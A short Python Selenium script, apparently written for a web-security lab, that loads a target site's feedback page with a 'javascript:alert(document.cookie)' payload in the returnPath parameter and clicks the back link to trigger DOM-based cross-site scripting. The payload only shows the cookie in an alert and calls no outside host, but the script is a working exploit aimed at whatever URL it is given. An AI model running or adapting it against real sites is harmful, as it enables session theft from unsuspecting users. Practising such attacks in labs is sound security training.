import time
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager

def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <URL>")
        sys.exit(1)
    
    base_url = sys.argv[1]

    modified_url = base_url + "/feedback?returnPath=javascript:alert(document.cookie)"
    
    try:
        service = FirefoxService(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=service)

        driver.get(modified_url)
        print(f"Opened URL: {modified_url}")

        back_link = driver.find_element(By.ID, "backLink")
        back_link.click()

        #sleep bo internet moze zamulac
        time.sleep(5)
        driver.quit()

    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
